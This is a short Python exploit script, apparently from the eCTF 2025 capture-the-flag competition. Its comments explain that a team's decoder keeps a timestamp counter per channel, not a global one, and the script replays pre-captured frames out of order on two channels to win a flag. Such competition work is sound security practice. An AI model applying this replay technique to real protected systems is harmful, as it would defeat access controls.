# Execution of a "Pesky Neighbor" attack against a team
# This attack exploits a design flaw where instead of having a global timestamp counter for accepting frames
# after a certain timestamp, there is instead one per channel. This allows us to send out of order frames
# for one channel and then another, technically violating sequential timestamp requirements and earning a flag.

import time
import sys
import json

from ectf25.utils.decoder import DecoderIntf

if __name__ == "__main__":
    print("Running pesky neighbor attack")

    time.sleep(1)

    with open("frames.json") as f:
        frames = json.loads(f.read())

    ch0_frame = frames["ch0_frame"]
    ch1_frame = frames["ch1_frame"]

    decoder = DecoderIntf(sys.argv[1])

    decoder.list()

    decoder.decode(bytes.fromhex(ch0_frame["encoded"]))

    decoder.decode(bytes.fromhex(ch1_frame["encoded"]))

    print("Successfully decoded earlier frame")
